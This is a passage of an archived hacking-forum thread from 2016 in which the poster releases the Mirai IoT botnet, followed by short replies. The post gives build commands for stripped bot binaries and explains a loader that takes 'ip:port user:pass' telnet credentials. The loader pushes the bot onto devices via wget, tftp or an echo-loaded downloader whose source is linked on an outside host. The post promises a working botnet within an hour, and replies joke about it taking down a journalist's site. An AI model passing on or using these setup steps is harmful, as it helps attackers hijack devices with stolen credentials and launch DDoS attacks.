+<div class="codeblock"><div class="title">Code <span class="copynotice" style="color: white; position: relative; left: 4px; top: 1px; cursor: pointer;" title="Select All + Copy"><i class="fa fa-clipboard" aria-hidden="true"></i></span></div><div class="body" dir="ltr"><code class="phpcode">./build.sh release telnet</code></div></div>Will
+ output production-ready binaries of bot that are extremely stripped, 
+small (about 60K) that should be loaded onto devices. Compiles all 
+binaries in format: "mirai.$ARCH" to ./mirai/release folder<br>
+<br>
+<br>
+<span style="font-size: x-large;" class="mycode_size">Building Echo Loader</span><br>
+Loader reads telnet entries from STDIN in following format: <br>
+<div class="codeblock"><div class="title">Code <span class="copynotice" style="color: white; position: relative; left: 4px; top: 1px; cursor: pointer;" title="Select All + Copy"><i class="fa fa-clipboard" aria-hidden="true"></i></span></div><div class="body" dir="ltr"><code class="phpcode">ip:port user:pass</code></div></div>It
+ detects if there is wget or tftp, and tries to download the binary 
+using that. If not, it will echoload a tiny binary (about 1kb) that will
+ suffice as wget. You can find code to compile the tiny downloader stub h
+ ere<br>
+<a href="http://santasbigcandycane.cx/dlr.src.zip" target="_blank" rel="ugc" class="mycode_url">http://santasbigcandycane.cx/dlr.src.zip</a><br>
+<br>
+You need to edit your main.c for the dlr to include the HTTP server IP. 
+The idea is, if the iot device doesn have tftp or wget, then it will 
+echo load this 2kb binary, which download the real binary, since echo 
+loading really slow.<br>
+When you compile, place your dlr.* files into the folder ./bins for the loader<br>
+<br>
+<div class="codeblock"><div class="title">Code <span class="copynotice" style="color: white; position: relative; left: 4px; top: 1px; cursor: pointer;" title="Select All + Copy"><i class="fa fa-clipboard" aria-hidden="true"></i></span></div><div class="body" dir="ltr"><code class="phpcode">./build.sh</code></div></div>Will build the loader, optimized, production use, no fuss. If you have a file in formats used for loading, you can do this<br>
+<br>
+<div class="codeblock"><div class="title">Code <span class="copynotice" style="color: white; position: relative; left: 4px; top: 1px; cursor: pointer;" title="Select All + Copy"><i class="fa fa-clipboard" aria-hidden="true"></i></span></div><div class="body" dir="ltr"><code class="phpcode">cat file.txt | ./loader</code></div></div><br>
+Remember to ulimit!<br>
+<br>
+Just so it's clear, I'm not providing any kind of 1 on 1 help tutorials 
+or Clay Davis, too much time. All scripts and everything are included to
+ set up working botnet in under 1 hours. I am willing to help if you 
+have individual questions (how come CNC not connecting to database, I 
+did this this this blah blah), but not questions like "My bot not 
+connect, fix it"
+	</div>
+	
+	
+	</div></div>
+	
+<div style="" id="tyl_52615667"></div>
+<div class="post_controls">
+	<div class="postbit_buttons author_buttons float_left">
+		
+<a href="https://hackforums.net/search.php?action=finduser&amp;uid=3201035" title="Find all posts by this user" class="postbit_find desktop-inline-block" rel="nofollow" data-tooltip="Find User Posts"><span><i class="fa fa-search fa-lg" aria-hidden="true"></i></span></a>
+
+	</div>
+
+	<div class="postbit_buttons post_management_buttons float_right">
+
+
+
+
+
+
+
+
+<a href="javascript:Report.reportPost(52615667);" title="Report this post to a moderator" class="postbit_report" data-tooltip="Report"><span><i class="fa fa-bolt fa-lg" aria-hidden="true"></i></span></a>
+
+
+
+
+
+
+
+</div>
+<div class="clear"></div>
+      </div> 
+</div>
+
+
+
+<a name="pid52615804" id="pid52615804"></a>
+<div class="post classic  clear" style="" id="post_52615804">
+<div class="post_wrapper">
+<div class="post_author scaleimages">
+	
+<div class="author_avatar"><a href="https://hackforums.net/member.php?action=profile&amp;uid=1681387" title="Decafe joined Feb 2013"><img src="page1_files/default_avatar_002.png" alt="Decafe" width="100" height="100"></a></div>
+
+	<div class="author_information">
+			<strong><span class="largetext"><a href="https://hackforums.net/member.php?action=profile&amp;uid=1681387"><span class="group28">Decafe</span></a></span></strong> 
+<img src="page1_files/buddy_offline.png" title="Offline" alt="Offline" class="buddy_status">
+<br>
+			<span class="smalltext">
+				Memes<br>
+				<img src="page1_files/ub3rstar.gif" alt="*" border="0"><img src="page1_files/ub3rstar.gif" alt="*" border="0"><img src="page1_files/ub3rstar.gif" alt="*" border="0"><br>
+				
+<img src="page1_files/ub3r.png" alt="HF Ub3r" title="HF Ub3r">
+<br>
+			</span>
+                        <div class="post_myawards"><span style="white-space:normal; width: 100%;"><i class="award_sprite award_40" title="Thanks"></i><i class="award_sprite award_84" title="The Darkness is all around us."></i><i class="award_sprite award_79" title="Thank you for supporting legalization."></i><i class="award_sprite award_35" title="Thank you for making the donation."></i><i class="award_sprite award_92" title="You are now an Ethereist."></i><i class="award_sprite award_66" title="Another little Brony prancing around HF."></i></span></div>
+	</div>
+	<div class="author_statistics">
+		<div class="author_wrapper">
+		     
+	<div class="author_row"><div class="author_label">Posts:</div> <div class="author_value">666</div></div>
+	<div class="author_row"><div class="author_label">Threads:</div> <div class="author_value">31</div></div>
+	
+	
+	
+<div class="author_row"><div class="author_label">B Rating:</div><div class="author_value"><a href="https://hackforums.net/marketcp.php?action=brating&amp;uid=1681387" title="Business Rating of Decafe"><strong class="reputation_positive" style="padding-left: 5px;">0</strong><strong style="padding-left: 5px; color: white;">0</strong><strong class="reputation_negative" style="padding-left: 5px;">0</strong></a></div></div><div class="author_row"><div class="author_label">Popularity:</div> <div class="author_value">
+<a href="https://hackforums.net/reputation.php?uid=1681387" rel="nofollow"><strong class="reputation_neutral">0</strong></a>
+</div></div>
+
+    <div class="author_row"><div class="author_label">βytes:</div> <div class="author_value"><a href="javascript:void(0)" onclick="MyBB.popupWindow('/myps.php?action=donate&amp;uid=1681387&amp;pid=52615804&amp;modal=1'); return false;" rel="nofollow"><i class="fa fa-plus-circle" style="color: #4CAF50;" aria-hidden="true"></i></a><a href="https://hackforums.net/misc.php?action=help&amp;hid=43" rel="nofollow"><strong> β</strong></a> -23.5</div></div>
+	<div class="author_row"><div class="author_label">Game XP:</div> <div class="author_value"><a href="https://hackforums.net/gamecp.php?action=profile&amp;uid=1681387" title="Hacker Game Decafe Profile">0</a></div></div>
+
+		</div>
+	</div>
+</div>
+<div class="post_content">
+	<div class="post_head">
+		
+<div class="float_right" style="vertical-align: top; position: relative;">
+<a href="javascript:void(0);" class="share_button" onclick="Thread.toggleShare(52615804);" data-tooltip="Share"><i class="fa fa-share-alt" aria-hidden="true"></i></a>
+<!-- IS_UNREAD --><strong><a href="https://hackforums.net/showthread.php?tid=5420472&amp;pid=52615804#pid52615804" id="post_url_52615804" title="*" rel="nofollow">#2</a></strong>
+
+</div>
+
+		
+		<span class="post_date">09-30-2016, 08:02 PM <span class="post_edit" id="edited_by_52615804"></span></span>
+	
+	</div>
+	<div class="post_body scaleimages" id="pid_52615804">
+		So many kids have learned basic c for nothing now, they could've just leached!
+	</div>
+	
+	
+<div class="signature scaleimages">
+I don't deal via skype without special circumstances.
+</div>
+
+	</div></div>
+	
+<div style="" id="tyl_52615804"></div>
+<div class="post_controls">
+	<div class="postbit_buttons author_buttons float_left">
+		
+<a href="https://hackforums.net/convo.php?action=user&amp;uid=1681387" title="Convo" class="postbit_bullhorn" rel="nofollow" data-tooltip="Send Convo"><span><i class="fa fa-bullhorn  fa-lg" aria-hidden="true"></i></span></a>
+
+<a href="https://hackforums.net/search.php?action=finduser&amp;uid=1681387" title="Find all posts by this user" class="postbit_find desktop-inline-block" rel="nofollow" data-tooltip="Find User Posts"><span><i class="fa fa-search fa-lg" aria-hidden="true"></i></span></a>
+
+	</div>
+
+	<div class="postbit_buttons post_management_buttons float_right">
+
+
+
+
+
+
+
+
+<a href="javascript:Report.reportPost(52615804);" title="Report this post to a moderator" class="postbit_report" data-tooltip="Report"><span><i class="fa fa-bolt fa-lg" aria-hidden="true"></i></span></a>
+
+
+
+
+
+
+
+</div>
+<div class="clear"></div>
+      </div> 
+</div>
+
+
+
+<a name="pid52615813" id="pid52615813"></a>
+<div class="post classic  clear" style="" id="post_52615813">
+<div class="post_wrapper">
+<div class="post_author scaleimages">
+	
+<div class="author_avatar"><a href="https://hackforums.net/member.php?action=profile&amp;uid=2978478" title="ﾌ乇丂ㄒ乇尺 joined Dec 2015"><img src="page1_files/1ss.png" alt="ﾌ乇丂ㄒ乇尺" width="80" height="100"></a></div>
+
+	<div class="author_information">
+			<strong><span class="largetext"><a href="https://hackforums.net/member.php?action=profile&amp;uid=2978478"><span class="group28">ﾌ乇丂ㄒ乇尺</span></a></span></strong> 
+<img src="page1_files/buddy_offline.png" title="Offline" alt="Offline" class="buddy_status">
+<br>
+			<span class="smalltext">
+				[bin@HF:]<br>
+				<img src="page1_files/ub3rstar.gif" alt="*" border="0"><img src="page1_files/ub3rstar.gif" alt="*" border="0"><img src="page1_files/ub3rstar.gif" alt="*" border="0"><br>
+				
+<img src="page1_files/ub3r.png" alt="HF Ub3r" title="HF Ub3r">
+<br>
+			</span>
+                        <div class="post_myawards"><span style="white-space:normal; width: 100%;"><i class="award_sprite award_40" title="Thanks"></i></span></div>
+	</div>
+	<div class="author_statistics">
+		<div class="author_wrapper">
+		     
+	<div class="author_row"><div class="author_label">Posts:</div> <div class="author_value">513</div></div>
+	<div class="author_row"><div class="author_label">Threads:</div> <div class="author_value">21</div></div>
+	
+	
+	
+<div class="author_row"><div class="author_label">B Rating:</div><div class="author_value"><a href="https://hackforums.net/marketcp.php?action=brating&amp;uid=2978478" title="Business Rating of ﾌ乇丂ㄒ乇尺"><strong class="reputation_positive" style="padding-left: 5px;">1</strong><strong style="padding-left: 5px; color: white;">0</strong><strong class="reputation_negative" style="padding-left: 5px;">0</strong></a></div></div><div class="author_row"><div class="author_label">Popularity:</div> <div class="author_value">
+<a href="https://hackforums.net/reputation.php?uid=2978478" rel="nofollow"><strong class="reputation_positive">68</strong></a>
+</div></div>
+
+    <div class="author_row"><div class="author_label">βytes:</div> <div class="author_value"><a href="javascript:void(0)" onclick="MyBB.popupWindow('/myps.php?action=donate&amp;uid=2978478&amp;pid=52615813&amp;modal=1'); return false;" rel="nofollow"><i class="fa fa-plus-circle" style="color: #4CAF50;" aria-hidden="true"></i></a><a href="https://hackforums.net/misc.php?action=help&amp;hid=43" rel="nofollow"><strong> β</strong></a> 38</div></div>
+	<div class="author_row"><div class="author_label">Game XP:</div> <div class="author_value"><a href="https://hackforums.net/gamecp.php?action=profile&amp;uid=2978478" title="Hacker Game ﾌ乇丂ㄒ乇尺 Profile">190</a></div></div>
+
+		</div>
+	</div>
+</div>
+<div class="post_content">
+	<div class="post_head">
+		
+<div class="float_right" style="vertical-align: top; position: relative;">
+<a href="javascript:void(0);" class="share_button" onclick="Thread.toggleShare(52615813);" data-tooltip="Share"><i class="fa fa-share-alt" aria-hidden="true"></i></a>
+<!-- IS_UNREAD --><strong><a href="https://hackforums.net/showthread.php?tid=5420472&amp;pid=52615813#pid52615813" id="post_url_52615813" title="*" rel="nofollow">#3</a></strong>
+
+</div>
+
+		
+		<span class="post_date">09-30-2016, 08:03 PM <span class="post_edit" id="edited_by_52615813"></span></span>
+	
+	</div>
+	<div class="post_body scaleimages" id="pid_52615813">
+		Anna-Senpai took down Krebs confirmed.
+	</div>
+	
+	
+<div class="signature scaleimages">
+<div style="text-align: center;" class="mycode_align">
+＜￣｀ヽ、　　　　　　　／￣＞<br>
+　ゝ、　　＼　／⌒ヽ,ノ 　/´<br>
+　　　ゝ、　（( ͡° ͜ʖ ͡°) ／<br>
+　　 　　&gt;　 　 　,ノ<br>
+　 &nbsp; &nbsp; &nbsp; &nbsp;　  ∠_,,,/´”´”<br>
+BirdBro says <a href="https://hackforums.net/showthread.php?tid=5779367" target="_blank" rel="ugc" class="mycode_url">Buy FuckAV</a>.</div>
+　
+</div>
+
+	</div></div>
+	
+<div style="" id="tyl_52615813"></div>
+<div class="post_controls">
+	<div class="postbit_buttons author_buttons float_left">
+		
+<a href="https://hackforums.net/convo.php?action=user&amp;uid=2978478" title="Convo" class="postbit_bullhorn" rel="nofollow" data-tooltip="Send Convo"><span><i class="fa fa-bullhorn  fa-lg" aria-hidden="true"></i></span></a>
+
+<a href="https://hackforums.net/search.php?action=finduser&amp;uid=2978478" title="Find all posts by this user" class="postbit_find desktop-inline-block" rel="nofollow" data-tooltip="Find User Posts"><span><i class="fa fa-search fa-lg" aria-hidden="true"></i></span></a>
+
+	</div>
+
+	<div class="postbit_buttons post_management_buttons float_right">
+
+
+
+
+
+
+
+
+<a href="javascript:Report.reportPost(52615813);" title="Report this post to a moderator" class="postbit_report" data-tooltip="Report"><span><i class="fa fa-bolt fa-lg" aria-hidden="true"></i></span></a>
+
+
+
+
+
+
+
+</div>
+<div class="clear"></div>
+      </div> 
+</div>
+
+
+
+<a name="pid52615827" id="pid52615827"></a>
+<div class="post classic  clear" style="" id="post_52615827">
+<div class="post_wrapper">
+<div class="post_author scaleimages">
+	
+<div class="author_avatar"><a href="https://hackforums.net/member.php?action=profile&amp;uid=2141853" title="Prani joined Jan 2014"><img src="page1_files/default_avatar_002.png" alt="Prani" width="100" height="100"></a></div>
+
+	<div class="author_information">
+			<strong><span class="largetext"><a href="https://hackforums.net/member.php?action=profile&amp;uid=2141853"><span class="group28">Prani</span></a></span></strong> 
+<a href="https://hackforums.net/member.php?action=profile&amp;uid=2141853" title="Away"><img src="page1_files/buddy_away.png" alt="Away" class="buddy_status" border="0"></a>
+<br>
+			<span class="smalltext">
+				 ; )<br>
+				<img src="page1_files/ub3rstar.gif" alt="*" border="0"><img src="page1_files/ub3rstar.gif" alt="*" border="0"><br>
+				
+<img src="page1_files/ub3r.png" alt="HF Ub3r" title="HF Ub3r">
+<br>
+			</span>
+                        <div class="post_myawards"><span style="white-space:normal; width: 100%;"><i class="award_sprite award_40" title="Thanks"></i></span></div>
+	</div>
+	<div class="author_statistics">
+		<div class="author_wrapper">
+		     
+	<div class="author_row"><div class="author_label">Posts:</div> <div class="author_value">336</div></div>
+	<div class="author_row"><div class="author_label">Threads:</div> <div class="author_value">1</div></div>
+	
+	
+	
+<div class="author_row"><div class="author_label">B Rating:</div><div class="author_value"><a href="https://hackforums.net/marketcp.php?action=brating&amp;uid=2141853" title="Business Rating of Prani"><strong class="reputation_positive" style="padding-left: 5px;">0</strong><strong style="padding-left: 5px; color: white;">0</strong><strong class="reputation_negative" style="padding-left: 5px;">0</strong></a></div></div><div class="author_row"><div class="author_label">Popularity:</div> <div class="author_value">
+<a href="https://hackforums.net/reputation.php?uid=2141853" rel="nofollow"><strong class="reputation_positive">26</strong></a>
+</div></div>
+
+    <div class="author_row"><div class="author_label">βytes:</div> <div class="author_value"><a href="javascript:void(0)" onclick="MyBB.popupWindow('/myps.php?action=donate&amp;uid=2141853&amp;pid=52615827&amp;modal=1'); return false;" rel="nofollow"><i class="fa fa-plus-circle" style="color: #4CAF50;" aria-hidden="true"></i></a><a href="https://hackforums.net/misc.php?action=help&amp;hid=43" rel="nofollow"><strong> β</strong></a> 27</div></div>
+	<div class="author_row"><div class="author_label">Game XP:</div> <div class="author_value"><a href="https://hackforums.net/gamecp.php?action=profile&amp;uid=2141853" title="Hacker Game Prani Profile">0</a></div></div>
+
+		</div>
+	</div>
+</div>
+<div class="post_content">
+	<div class="post_head">
+		
+<div class="float_right" style="vertical-align: top; position: relative;">
+<a href="javascript:void(0);" class="share_button" onclick="Thread.toggleShare(52615827);" data-tooltip="Share"><i class="fa fa-share-alt" aria-hidden="true"></i></a>
+<!-- IS_UNREAD --><strong><a href="https://hackforums.net/showthread.php?tid=5420472&amp;pid=52615827#pid52615827" id="post_url_52615827" title="*" rel="nofollow">#4</a></strong>
+
+</div>
+
+		
+		<span class="post_date">09-30-2016, 08:04 PM <span class="post_edit" id="edited_by_52615827"></span></span>
+	
+	</div>
+	<div class="post_body scaleimages" id="pid_52615827">
+		A w w <br>
+O n i i - c h a n
+	</div>
+	
+	
+	</div></div>
+	
+<div style="" id="tyl_52615827"></div>
+<div class="post_controls">
+	<div class="postbit_buttons author_buttons float_left">
+		
+<a href="https://hackforums.net/convo.php?action=user&amp;uid=2141853" title="Convo" class="postbit_bullhorn" rel="nofollow" data-tooltip="Send Convo"><span><i class="fa fa-bullhorn  fa-lg" aria-hidden="true"></i></span></a>
+
+<a href="https://hackforums.net/search.php?action=finduser&amp;uid=2141853" title="Find all posts by this user" class="postbit_find desktop-inline-block" rel="nofollow" data-tooltip="Find User Posts"><span><i class="fa fa-search fa-lg" aria-hidden="true"></i></span></a>
+
+	</div>
+
+	<div class="postbit_buttons post_management_buttons float_right">
+
+
+
+
+
+
+
+
+<a href="javascript:Report.reportPost(52615827);" title="Report this post to a moderator" class="postbit_report" data-tooltip="Report"><span><i class="fa fa-bolt fa-lg" aria-hidden="true"></i></span></a>
+
+
+
+
+
+
+
+</div>
+<div class="clear"></div>
+      </div> 
+</div>
+
+
+
+<a name="pid52615831" id="pid52615831"></a>
+<div class="post classic  clear" style="" id="post_52615831">
+<div class="post_wrapper">
+<div class="post_author scaleimages">
+	
+<div class="author_avatar"><a href="https://hackforums.net/member.php?action=profile&amp;uid=3201035" title="Anna-senpai joined Jul 2016"><img src="page1_files/default_avatar_002.png" alt="Anna-senpai" width="100" height="100"></a></div>
+
+	<div class="author_information">
+			<strong><span class="largetext"><a href="https://hackforums.net/member.php?action=profile&amp;uid=3201035"><span style="color:#383838">Anna-senpai</span></a></span></strong> 
+<img src="page1_files/buddy_offline.png" title="Offline" alt="Offline" class="buddy_status">
+<br>
+			<span class="smalltext">
+				[closed@HF:]<br>
+				
+				
+			</span>
+                        <div class="post_myawards"></div>
+	</div>
+	<div class="author_statistics">
+		<div class="author_wrapper">
+		     
+	<div class="author_row"><div class="author_label">Posts:</div> <div class="author_value">247</div></div>
+	<div class="author_row"><div class="author_label">Threads:</div> <div class="author_value">9</div></div>
+	
+	
+	
+<div class="author_row"><div class="author_label">B Rating:</div><div class="author_value"><a href="https://hackforums.net/marketcp.php?action=brating&amp;uid=3201035" title="Business Rating of Anna-senpai"><strong class="reputation_positive" style="padding-left: 5px;">0</strong><strong style="padding-left: 5px; color: white;">0</strong><strong class="reputation_negative" style="padding-left: 5px;">0</strong></a></div></div><div class="author_row"><div class="author_label">Popularity:</div> <div class="author_value">
+<a href="https://hackforums.net/reputation.php?uid=3201035" rel="nofollow"><strong class="reputation_positive">12</strong></a>
+</div></div>
+
+    <div class="author_row"><div class="author_label">βytes:</div> <div class="author_value"><a href="javascript:void(0)" onclick="MyBB.popupWindow('/myps.php?action=donate&amp;uid=3201035&amp;pid=52615831&amp;modal=1'); return false;" rel="nofollow"><i class="fa fa-plus-circle" style="color: #4CAF50;" aria-hidden="true"></i></a><a href="https://hackforums.net/misc.php?action=help&amp;hid=43" rel="nofollow"><strong> β</strong></a> 0</div></div>
+	<div class="author_row"><div class="author_label">Game XP:</div> <div class="author_value"><a href="https://hackforums.net/gamecp.php?action=profile&amp;uid=3201035" title="Hacker Game Anna-senpai Profile">0</a></div></div>
+
+		</div>
+	</div>
+</div>
+<div class="post_content">
+	<div class="post_head">
+		
+<div class="float_right" style="vertical-align: top; position: relative;">
+<a href="javascript:void(0);" class="share_button" onclick="Thread.toggleShare(52615831);" data-tooltip="Share"><i class="fa fa-share-alt" aria-hidden="true"></i></a>
+<!-- IS_UNREAD --><strong><a href="https://hackforums.net/showthread.php?tid=5420472&amp;pid=52615831#pid52615831" id="post_url_52615831" title="*" rel="nofollow">#5</a></strong>
+
+</div>
+
+		
+		<span class="post_date">09-30-2016, 08:04 PM <span class="post_edit" id="edited_by_52615831"></span></span>
+	
+	</div>
+	<div class="post_body scaleimages" id="pid_52615831">
+		<blockquote class="mycode_quote"><cite><span> (09-30-2016, 08:03 PM)</span>ﾌ乇丂ㄒ乇尺 Wrote: <a href="https://hackforums.net/showthread.php?pid=52615813#pid52615813" class="quick_jump">&nbsp;</a></cite>Anna-Senpai took down Krebs confirmed.</blockquote><br>
+This is not an admission of guilt
+	</div>
+	
+	
+	</div></div>
+	
+<div style="" id="tyl_52615831"></div>
+<div class="post_controls">
+	<div class="postbit_buttons author_buttons float_left">
+		
+<a href="https://hackforums.net/search.php?action=finduser&amp;uid=3201035" title="Find all posts by this user" class="postbit_find desktop-inline-block" rel="nofollow" data-tooltip="Find User Posts"><span><i class="fa fa-search fa-lg" aria-hidden="true"></i></span></a>
+
+	</div>
+
+	<div class="postbit_buttons post_management_buttons float_right">
+
+
+
+
+
+
+
+
+<a href="javascript:Report.reportPost(52615831);" title="Report this post to a moderator" class="postbit_report" data-tooltip="Report"><span><i class="fa fa-bolt fa-lg" aria-hidden="true"></i></span></a>
+
+
+
+
+
+
+
+</div>
+<div class="clear"></div>
+      </div> 
+</div>
+
+
+
+<a name="pid52615833" id="pid52615833"></a>
+<div class="post classic  clear" style="" id="post_52615833">
+<div class="post_wrapper">
+<div class="post_author scaleimages">
+	
+<div class="author_avatar"><a href="https://hackforums.net/member.php?action=profile&amp;uid=3293077" title="Derfish joined Sep 2016"><img src="page1_files/default_avatar_002.png" alt="Derfish" width="100" height="100"></a></div>
+
+	<div class="author_information">
+			<strong><span class="largetext"><a href="https://hackforums.net/member.php?action=profile&amp;uid=3293077"><span style="color:#383838">Derfish</span></a></span></strong> 
+<img src="page1_files/buddy_offline.png" title="Offline" alt="Offline" class="buddy_status">
+<br>
+			<span class="smalltext">
+				[closed@HF:]<br>
+				
+				
+			</span>
+                        <div class="post_myawards"></div>
+	</div>
+	<div class="author_statistics">
+		<div class="author_wrapper">
+		     
+	<div class="author_row"><div class="author_label">Posts:</div> <div class="author_value">240</div></div>
+	<div class="author_row"><div class="author_label">Threads:</div> <div class="author_value">1</div></div>
+	
+	
+	
+<div class="author_row"><div class="author_label">B Rating:</div><div class="author_value"><a href="https://hackforums.net/marketcp.php?action=brating&amp;uid=3293077" title="Business Rating of Derfish"><strong class="reputation_positive" style="padding-left: 5px;">0</strong><strong style="padding-left: 5px; color: white;">0</strong><strong class="reputation_negative" style="padding-left: 5px;">0</strong></a></div></div><div class="author_row"><div class="author_label">Popularity:</div> <div class="author_value">
+<a href="https://hackforums.net/reputation.php?uid=3293077" rel="nofollow"><strong class="reputation_neutral">0</strong></a>
+</div></div>
+
+    <div class="author_row"><div class="author_label">βytes:</div> <div class="author_value"><a href="javascript:void(0)" onclick="MyBB.popupWindow('/myps.php?action=donate&amp;uid=3293077&amp;pid=52615833&amp;modal=1'); return false;" rel="nofollow"><i class="fa fa-plus-circle" style="color: #4CAF50;" aria-hidden="true"></i></a><a href="https://hackforums.net/misc.php?action=help&amp;hid=43" rel="nofollow"><strong> β</strong></a> 0</div></div>
+	<div class="author_row"><div class="author_label">Game XP:</div> <div class="author_value"><a href="https://hackforums.net/gamecp.php?action=profile&amp;uid=3293077" title="Hacker Game Derfish Profile">0</a></div></div>
+
+		</div>
+	</div>
+</div>
+<div class="post_content">
+	<div class="post_head">
+		
+<div class="float_right" style="vertical-align: top; position: relative;">
+<a href="javascript:void(0);" class="share_button" onclick="Thread.toggleShare(52615833);" data-tooltip="Share"><i class="fa fa-share-alt" aria-hidden="true"></i></a>
+<!-- IS_UNREAD --><strong><a href="https://hackforums.net/showthread.php?tid=5420472&amp;pid=52615833#pid52615833" id="post_url_52615833" title="*" rel="nofollow">#6</a></strong>
+
+</div>
+
+		
+		<span class="post_date">09-30-2016, 08:05 PM <span class="post_edit" id="edited_by_52615833"></span></span>
+	
+	</div>
+	<div class="post_body scaleimages" id="pid_52615833">
+		<blockquote class="mycode_quote"><cite><span> (09-30-2016, 08:03 PM)</span>ﾌ乇丂ㄒ乇尺 Wrote: <a href="https://hackforums.net/showthread.php?pid=52615813#pid52615813" class="quick_jump">&nbsp;</a></cite>Anna-Senpai took down Krebs confirmed.</blockquote><br>
+no, it was clearly that very knowledgeable guy BannedOffline <img src="page1_files/oui.gif" alt="Oui" title="Oui" class="smilie smilie_13">
+	</div>
+	
+	
+	</div></div>
+	
+<div style="" id="tyl_52615833"></div>
+<div class="post_controls">
+	<div class="postbit_buttons author_buttons float_left">
+		
+<a href="https://hackforums.net/search.php?action=finduser&amp;uid=3293077" title="Find all posts by this user" class="postbit_find desktop-inline-block" rel="nofollow" data-tooltip="Find User Posts"><span><i class="fa fa-search fa-lg" aria-hidden="true"></i></span></a>
+
+	</div>
+
+	<div class="postbit_buttons post_management_buttons float_right">
+
+
+
+
+
+
+
+
+<a href="javascript:Report.reportPost(52615833);" title="Report this post to a moderator" class="postbit_report" data-tooltip="Report"><span><i class="fa fa-bolt fa-lg" aria-hidden="true"></i></span></a>
+
+
+
+
+
+
+
+</div>
+<div class="clear"></div>
+      </div> 
+</div>
+
+
+
+<a name="pid52615834" id="pid52615834"></a>
+<div class="post classic  clear" style="" id="post_52615834">
+<div class="post_wrapper">
+<div class="post_author scaleimages">
+	
+<div class="author_avatar"><a href="https://hackforums.net/member.php?action=profile&amp;uid=2961605" title="Bescht joined Dec 2015"><img src="page1_files/default_avatar_002.png" alt="Bescht" width="100" height="100"></a></div>
+
+	<div class="author_information">
+			<strong><span class="largetext"><a href="https://hackforums.net/member.php?action=profile&amp;uid=2961605"><span class="group2">Bescht</span></a></span></strong> 
+<img src="page1_files/buddy_offline.png" title="Offline" alt="Offline" class="buddy_status">
+<br>
+			<span class="smalltext">
+				[bin@HF:]<br>
+				<img src="page1_files/star.gif" alt="*" border="0"><img src="page1_files/star.gif" alt="*" border="0"><img src="page1_files/star.gif" alt="*" border="0"><br>
+				
+			</span>
+                        <div class="post_myawards"></div>
+	</div>
+	<div class="author_statistics">
+		<div class="author_wrapper">
+		     
+	<div class="author_row"><div class="author_label">Posts:</div> <div class="author_value">832</div></div>
+	<div class="author_row"><div class="author_label">Threads:</div> <div class="author_value">65</div></div>
+	
+	
+	
+<div class="author_row"><div class="author_label">B Rating:</div><div class="author_value"><a href="https://hackforums.net/marketcp.php?action=brating&amp;uid=2961605" title="Business Rating of Bescht"><strong class="reputation_positive" style="padding-left: 5px;">0</strong><strong style="padding-left: 5px; color: white;">0</strong><strong class="reputation_negative" style="padding-left: 5px;">0</strong></a></div></div><div class="author_row"><div class="author_label">Popularity:</div> <div class="author_value">
+<a href="https://hackforums.net/reputation.php?uid=2961605" rel="nofollow"><strong class="reputation_negative">-3</strong></a>
+</div></div>
+
+    <div class="author_row"><div class="author_label">βytes:</div> <div class="author_value"><a href="javascript:void(0)" onclick="MyBB.popupWindow('/myps.php?action=donate&amp;uid=2961605&amp;pid=52615834&amp;modal=1'); return false;" rel="nofollow"><i class="fa fa-plus-circle" style="color: #4CAF50;" aria-hidden="true"></i></a><a href="https://hackforums.net/misc.php?action=help&amp;hid=43" rel="nofollow"><strong> β</strong></a> 0</div></div>
+	<div class="author_row"><div class="author_label">Game XP:</div> <div class="author_value"><a href="https://hackforums.net/gamecp.php?action=profile&amp;uid=2961605" title="Hacker Game Bescht Profile">0</a></div></div>
+
+		</div>
+	</div>
+</div>
+<div class="post_content">
+	<div class="post_head">
+		
+<div class="float_right" style="vertical-align: top; position: relative;">
+<a href="javascript:void(0);" class="share_button" onclick="Thread.toggleShare(52615834);" data-tooltip="Share"><i class="fa fa-share-alt" aria-hidden="true"></i></a>
+<!-- IS_UNREAD --><strong><a href="https://hackforums.net/showthread.php?tid=5420472&amp;pid=52615834#pid52615834" id="post_url_52615834" title="*" rel="nofollow">#7</a></strong>
+
+</div>
+
+		
+		<span class="post_date">09-30-2016, 08:05 PM <span class="post_edit" id="edited_by_52615834"></span></span>
+	
+	</div>
+	<div class="post_body scaleimages" id="pid_52615834">
+		Urgh nice. Look good lol. And yes. U have fugging right.
+	</div>
+	
+	
+	</div></div>
+	
+<div style="" id="tyl_52615834"></div>
+<div class="post_controls">
+	<div class="postbit_buttons author_buttons float_left">
+		
+<a href="https://hackforums.net/convo.php?action=user&amp;uid=2961605" title="Convo" class="postbit_bullhorn" rel="nofollow" data-tooltip="Send Convo"><span><i class="fa fa-bullhorn  fa-lg" aria-hidden="true"></i></span></a>
+
+<a href="https://hackforums.net/search.php?action=finduser&amp;uid=2961605" title="Find all posts by this user" class="postbit_find desktop-inline-block" rel="nofollow" data-tooltip="Find User Posts"><span><i class="fa fa-search fa-lg" aria-hidden="true"></i></span></a>
+
+	</div>
+
+	<div class="postbit_buttons post_management_buttons float_right">
+
+
+
+
+
+
+
+
+<a href="javascript:Report.reportPost(52615834);" title="Report this post to a moderator" class="postbit_report" data-tooltip="Report"><span><i class="fa fa-bolt fa-lg" aria-hidden="true"></i></span></a>
+
+
+
+
+
+
+
+</div>
+<div class="clear"></div>
+      </div> 
+</div>
+
+
+
+<a name="pid52615836" id="pid52615836"></a>
+<div class="post classic  clear" style="" id="post_52615836">
+<div class="post_wrapper">
+<div class="post_author scaleimages">
+	
+<div class="author_avatar"><a href="https://hackforums.net/member.php?action=profile&amp;uid=2623266" title="Jаson joined Feb 2015"><img src="page1_files/avatar_2623266.png" alt="Jаson" width="100" height="100"></a></div>
+
+	<div class="author_information">
+			<strong><span class="largetext"><a href="https://hackforums.net/member.php?action=profile&amp;uid=2623266"><span class="group28">Jаson</span></a></span></strong> 
+<img src="page1_files/buddy_offline.png" title="Offline" alt="Offline" class="buddy_status">
+<br>
+			<span class="smalltext">
+				lonely stoner<br>
+				<img src="page1_files/ub3rstar.gif" alt="*" border="0"><img src="page1_files/ub3rstar.gif" alt="*" border="0"><img src="page1_files/ub3rstar.gif" alt="*" border="0"><img src="page1_files/ub3rstar.gif" alt="*" border="0"><br>
+				
+<img src="page1_files/ub3r.png" alt="HF Ub3r" title="HF Ub3r">
+<br>
+			</span>
